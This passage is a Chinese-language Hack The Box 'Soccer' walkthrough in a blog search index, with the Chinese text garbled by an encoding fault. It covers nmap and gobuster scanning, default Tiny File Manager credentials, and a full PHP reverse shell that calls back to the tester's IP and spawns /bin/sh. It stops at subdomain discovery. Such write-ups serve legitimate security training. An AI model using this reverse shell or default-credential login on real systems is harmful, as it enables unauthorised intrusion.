<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>HTB-Soccer</title>
    <url>/posts/d0709a37.html</url>
    <content><![CDATA[<h1 id="HTB-Soccer"><a href="#HTB-Soccer" class="headerlink" title="HTB-Soccer"></a>HTB-Soccer</h1><h2 id="ä¸€ã€æ€è·¯æ¦‚è¦"><a href="#ä¸€ã€æ€è·¯æ¦‚è¦" class="headerlink" title="ä¸€ã€æ€è·¯æ¦‚è¦"></a>ä¸€ã€æ€è·¯æ¦‚è¦</h2><p>1.ç›®å½•æ‰«æå‘ç°å­ç›®å½•å­˜åœ¨Tiny File Managerå¼±å£ä»¤ï¼›</p>
<p>2.å¼±å£ä»¤ç™»å½•åæ–‡ä»¶ä¸Šä¼ åå¼¹shellè·å–www-dataæƒé™ï¼›</p>
<p>3.ngnixé…ç½®æ–‡ä»¶ä¿¡æ¯æ³„éœ²å‘ç°soc-playerå­åŸŸï¼›</p>
<p>4.soc-playerå­åŸŸé¡µé¢æºç å‘ç°ä½¿ç”¨äº†WebSocketï¼›</p>
<p>5.WebSocketå®ç°SQLæ³¨å…¥è·å–sshè´¦æˆ·ï¼›</p>
<p>6.doaså’Œdstatè”åŠ¨ææƒ</p>
<h2 id="äºŒã€ä¿¡æ¯æ”¶é›†"><a href="#äºŒã€ä¿¡æ¯æ”¶é›†" class="headerlink" title="äºŒã€ä¿¡æ¯æ”¶é›†"></a>äºŒã€ä¿¡æ¯æ”¶é›†</h2><p>è¯ä¸å¤šè¯´ï¼Œnmapä¸€æŠŠæ¢­</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">nmap -sC -sV 10.10.11.194<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">â”Œâ”€â”€(rootğŸ’€kali)-[~/æ¡Œé¢]
â””â”€# nmap -sC -sV 10.10.11.194
Starting Nmap 7.91 ( https://nmap.org ) at 2023-02-06 04:01 EST
Nmap scan report for 10.10.11.194
Host is up (0.26s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ad:0d:84:a3:fd:cc:98:a4:78:fe:f9:49:15:da:e1:6d (RSA)
|   256 df:d6:a3:9f:68:26:9d:fc:7c:6a:0c:29:e9:61:f0:0c (ECDSA)
|_  256 57:97:56:5d:ef:79:3c:2f:cb:db:35:ff:f1:7c:61:5c (ED25519)
80/tcp   open  http            nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://soccer.htb/
9091/tcp open  xmltec-xmlmail?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq, drda, informix: 
......
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
......
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 49.39 seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å¼€æ”¾ç«¯å£ï¼š22ï¼ˆSSHï¼‰ã€80ï¼ˆHTTPï¼ŒngnixæœåŠ¡å™¨ï¼‰ã€9091</p>
<p>80ç«¯å£HTTPæœåŠ¡åŸŸåä¸ºsoccer.htbï¼Œå°†åŸŸåè§£ææ¡ç›®æ·»åŠ åˆ°hostsæ–‡ä»¶</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">echo "10.10.11.194 soccer.htb" &gt;&gt; /etc/hosts<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>æµè§ˆå™¨è®¿é—®soccer.htbï¼Œå¸¸è§„æ€è·¯è§‚å¯Ÿé¡µé¢ã€çœ‹æºç ï¼Œæ²¡ä¸œè¥¿</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230207100753493.png"></p>
<p>gobusteræ‰«ç›®å½•ï¼ˆPSï¼šé¾Ÿé€Ÿdirbè¿˜æ˜¯å°‘ç”¨ï¼‰</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">â”Œâ”€â”€(rootğŸ’€kali)-[~/æ¡Œé¢]
â””â”€# gobuster dir -u http://soccer.htb/ -w /usr/share/wordlists/dirb/big.txt 
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://soccer.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Timeout:                 10s
===============================================================
2023/02/06 07:27:43 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 162]
/.htpasswd            (Status: 403) [Size: 162]
Progress: 13324 / 20470 (65.09%)[ERROR] 2023/02/06 07:35:14 [!] Get "http://soccer.htb/our-blog": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 13333 / 20470 (65.13%)[ERROR] 2023/02/06 07:35:15 [!] Get "http://soccer.htb/out": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 13408 / 20470 (65.50%)[ERROR] 2023/02/06 07:35:21 [!] Get "http://soccer.htb/p7ap": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 14609 / 20470 (71.37%)[ERROR] 2023/02/06 07:36:13 [!] Get "http://soccer.htb/producttags": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 14614 / 20470 (71.39%)[ERROR] 2023/02/06 07:36:14 [!] Get "http://soccer.htb/profiles": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 14625 / 20470 (71.45%)[ERROR] 2023/02/06 07:36:17 [!] Get "http://soccer.htb/promoted": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 14652 / 20470 (71.58%)[ERROR] 2023/02/06 07:36:21 [!] Get "http://soccer.htb/proplayer": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 14707 / 20470 (71.85%)[ERROR] 2023/02/06 07:36:25 [!] Get "http://soccer.htb/prototype": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
/tiny                 (Status: 301) [Size: 178] [--&gt; http://soccer.htb/tiny/]
Progress: 20469 / 20470 (100.00%)
===============================================================
2023/02/06 07:40:00 Finished
===============================================================<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>æ‰«å¾—<code>http://soccer.htb/tiny/</code>ï¼Œæµè§ˆå™¨è®¿é—®ï¼Œæ˜¯ä¸ªç™»å½•ç•Œé¢</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230213093156511.png" style="zoom:67%;">

<p>ä¸‹æ–¹æœ‰ä¸ªè¶…é“¾æ¥ï¼š<a href="https://tinyfilemanager.github.io/">â€”â€” Â© CCP Programmers â€”â€”</a>ï¼Œæ‰“å¼€ä¸€çœ‹ï¼Œå°±æ˜¯ç™»å½•é¡µé¢çš„æ ‡é¢˜ã€‚</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230213095237007.png" style="zoom:67%;">

<h2 id="ä¸‰ã€Tiny-File-Managerå¼±å£ä»¤"><a href="#ä¸‰ã€Tiny-File-Managerå¼±å£ä»¤" class="headerlink" title="ä¸‰ã€Tiny File Managerå¼±å£ä»¤"></a>ä¸‰ã€Tiny File Managerå¼±å£ä»¤</h2><p>Githubæœ‰é»˜è®¤ç”¨æˆ·åå’Œå¯†ç </p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">é»˜è®¤ç”¨æˆ·å/å¯†ç :
admin/admin@123
user/12345<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h2 id="å››ã€æ–‡ä»¶ä¸Šä¼ åå¼¹shell"><a href="#å››ã€æ–‡ä»¶ä¸Šä¼ åå¼¹shell" class="headerlink" title="å››ã€æ–‡ä»¶ä¸Šä¼ åå¼¹shell"></a>å››ã€æ–‡ä»¶ä¸Šä¼ åå¼¹shell</h2><p>ç”¨adminç”¨æˆ·ç™»å½•è¿›æ¥ï¼Œæµè§ˆé¡µé¢ï¼Œæœ‰ä¸ªä¸Šä¼ ç‚¹ï¼Œé‚£å½“ç„¶æ˜¯è¯•è¯•èƒ½ä¸èƒ½ä¸Šä¼ ä¸ªåå¼¹shellã€‚è¯•æ¥è¯•å»ï¼Œå‘ç°åˆšè¿›æ¥çš„ä¸»ç•Œé¢æ˜¯/var/www/htmlç›®å½•ï¼Œæ­£å¸¸çš„wwwæœåŠ¡ç›®å½•ï¼Œä¸Šä¼ çš„è¯åªä¼šä¸Šä¼ åˆ°å½“å‰æ‰€åœ¨ç›®å½•ï¼Œè€Œä¸”åªæœ‰tiny/uploadsç›®å½•ä¸‹å¯ä»¥ä¸Šä¼ æˆåŠŸã€‚ç”±äºé¶åœºç¯å¢ƒä¼šéš”å‡ åˆ†é’Ÿåˆ·æ–°ï¼Œæ‰€ä»¥ä¸Šä¼ çš„æ–‡ä»¶ç•™å­˜ä¸äº†å¤ªä¹…ï¼Œå»ºè®®ä¸Šä¼ ä¹‹å‰å°±å¼€å¥½ç›‘å¬</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">nc -nvlp 3030	#ç«¯å£æ”¹æˆè‡ªå·±è„šæœ¬å¯¹åº”çš„<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230213095809172.png"></p>
<p>åå¼¹shellè„šæœ¬å¦‚ä¸‹ï¼Œæ³¨æ„ä¿®æ”¹ipä¸ºè‡ªå·±çš„vpnç¯å¢ƒçš„ipï¼ˆifconfigå‘½ä»¤çœ‹tun0ç½‘å¡ipï¼‰</p>
<p>å‚è€ƒ<a href="https://github.com/Cyberw1ng/Bug-Bounty/blob/main/rev_shell.php">https://github.com/Cyberw1ng/Bug-Bounty/blob/main/rev_shell.php</a></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token function">set_time_limit</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$VERSION</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"1.0"</span><span class="token punctuation">;</span>
<span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'10.10.16.6'</span><span class="token punctuation">;</span>  <span class="token comment">// CHANGE THIS</span>
<span class="token variable">$port</span> <span class="token operator">=</span> <span class="token number">3030</span><span class="token punctuation">;</span>       <span class="token comment">// CHANGE THIS</span>
<span class="token variable">$chunk_size</span> <span class="token operator">=</span> <span class="token number">1400</span><span class="token punctuation">;</span>
<span class="token variable">$write_a</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>
<span class="token variable">$error_a</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>
<span class="token variable">$shell</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'uname -a; w; id; /bin/sh -i'</span><span class="token punctuation">;</span>
<span class="token variable">$daemon</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token variable">$debug</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">function_exists</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'pcntl_fork'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

	<span class="token variable">$pid</span> <span class="token operator">=</span> <span class="token function">pcntl_fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$pid</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ERROR: Can't fork"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$pid</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
	<span class="token punctuation">}</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">posix_setsid</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Error: Can't setsid()"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token variable">$daemon</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
	<span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"WARNING: Failed to daemonise.  This is quite common and not fatal."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">umask</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$sock</span> <span class="token operator">=</span> <span class="token function">fsockopen</span><span class="token punctuation">(</span><span class="token variable">$ip</span><span class="token punctuation">,</span> <span class="token variable">$port</span><span class="token punctuation">,</span> <span class="token variable">$errno</span><span class="token punctuation">,</span> <span class="token variable">$errstr</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$sock</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
	<span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$errstr</span></span> (<span class="token interpolation"><span class="token variable">$errno</span></span>)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token variable">$descriptorspec</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>
   <span class="token number">0</span> <span class="token operator">=&gt;</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"pipe"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  
   <span class="token number">1</span> <span class="token operator">=&gt;</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"pipe"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  
   <span class="token number">2</span> <span class="token operator">=&gt;</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"pipe"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"w"</span><span class="token punctuation">)</span>   
<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$process</span> <span class="token operator">=</span> <span class="token function">proc_open</span><span class="token punctuation">(</span><span class="token variable">$shell</span><span class="token punctuation">,</span> <span class="token variable">$descriptorspec</span><span class="token punctuation">,</span> <span class="token variable">$pipes</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_resource</span><span class="token punctuation">(</span><span class="token variable">$process</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
	<span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ERROR: Can't spawn shell"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token function">stream_set_blocking</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">stream_set_blocking</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">stream_set_blocking</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">stream_set_blocking</span><span class="token punctuation">(</span><span class="token variable">$sock</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Successfully opened reverse shell to <span class="token interpolation"><span class="token variable">$ip</span></span>:<span class="token interpolation"><span class="token variable">$port</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">feof</span><span class="token punctuation">(</span><span class="token variable">$sock</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ERROR: Shell connection terminated"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">break</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">feof</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ERROR: Shell process terminated"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">break</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token variable">$read_a</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$sock</span><span class="token punctuation">,</span> <span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token variable">$num_changed_sockets</span> <span class="token operator">=</span> <span class="token function">stream_select</span><span class="token punctuation">(</span><span class="token variable">$read_a</span><span class="token punctuation">,</span> <span class="token variable">$write_a</span><span class="token punctuation">,</span> <span class="token variable">$error_a</span><span class="token punctuation">,</span> <span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$sock</span><span class="token punctuation">,</span> <span class="token variable">$read_a</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$debug</span><span class="token punctuation">)</span> <span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"SOCK READ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token variable">$input</span> <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$sock</span><span class="token punctuation">,</span> <span class="token variable">$chunk_size</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$debug</span><span class="token punctuation">)</span> <span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"SOCK: <span class="token interpolation"><span class="token variable">$input</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$read_a</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$debug</span><span class="token punctuation">)</span> <span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"STDOUT READ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token variable">$input</span> <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$chunk_size</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$debug</span><span class="token punctuation">)</span> <span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"STDOUT: <span class="token interpolation"><span class="token variable">$input</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$sock</span><span class="token punctuation">,</span> <span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$read_a</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$debug</span><span class="token punctuation">)</span> <span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"STDERR READ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token variable">$input</span> <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$chunk_size</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$debug</span><span class="token punctuation">)</span> <span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"STDERR: <span class="token interpolation"><span class="token variable">$input</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$sock</span><span class="token punctuation">,</span> <span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$sock</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">proc_close</span><span class="token punctuation">(</span><span class="token variable">$process</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function-definition function">printit</span> <span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$daemon</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token keyword">print</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$string</span></span>\n"</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token delimiter important">?&gt;</span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ä¸Šä¼ æˆåŠŸ</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230213110535059.png"></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230213110432889.png"></p>
<p>URLæ é‡Œè®¿é—®Shellæ–‡ä»¶<code>https://www.soccer.htb/tiny/uploads/ReverseShell.php</code></p>
<p>ç›‘å¬æ¥æ”¶åˆ°shellå“åº”</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230213114248912.png"></p>
<p>è·å–bashï¼Œä¹Ÿå°±æ˜¯è½¬æ¢æˆäº¤äº’å¼shell</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230213124920500.png"></p>
<p>æ­¤æ—¶æˆ‘ä»¬å…ˆçœ‹homeç›®å½•ï¼Œçœ‹æœ‰å“ªäº›ç”¨æˆ·ï¼Œç„¶åå‘ç°/home/playerç›®å½•ä¸‹æœ‰ä¸ªuser.txtï¼Œä½†www-dataç”¨æˆ·æ— è®¿é—®æƒé™</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230213125411132.png"></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230213125607328.png"></p>
<h2 id="äº”ã€ngnixé…ç½®æ–‡ä»¶æ•æ„Ÿä¿¡æ¯æ³„éœ²"><a href="#äº”ã€ngnixé…ç½®æ–‡ä»¶æ•æ„Ÿä¿¡æ¯æ³„éœ²" class="headerlink" title="äº”ã€ngnixé…ç½®æ–‡ä»¶æ•æ„Ÿä¿¡æ¯æ³„éœ²"></a>äº”ã€ngnixé…ç½®æ–‡ä»¶æ•æ„Ÿä¿¡æ¯æ³„éœ²</h2><p>ç„¶åæ¥çœ‹ngnixçš„é…ç½®æ–‡ä»¶ï¼Œåœ¨/etc/nginx/sites-enabledå‘ç°å­åŸŸåsoc-player.soccer.htbï¼Œè¿™å­åŸŸåä¹Ÿå¯ä»¥åœ¨/etc/hostså‘ç°</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230213153122893.png"></p>
<p>å†æ¬¡æ·»åŠ åŸŸåè§£ææ¡ç›®è¿›hostsæ–‡ä»¶ï¼Œç„¶åæµè§ˆå™¨è®¿é—®ï¼Œå¦‚ä¸‹å¯çœ‹åˆ°ã€Matchã€‘ã€ã€Loginã€‘ã€ã€Signupã€‘å­—æ®µ</p>
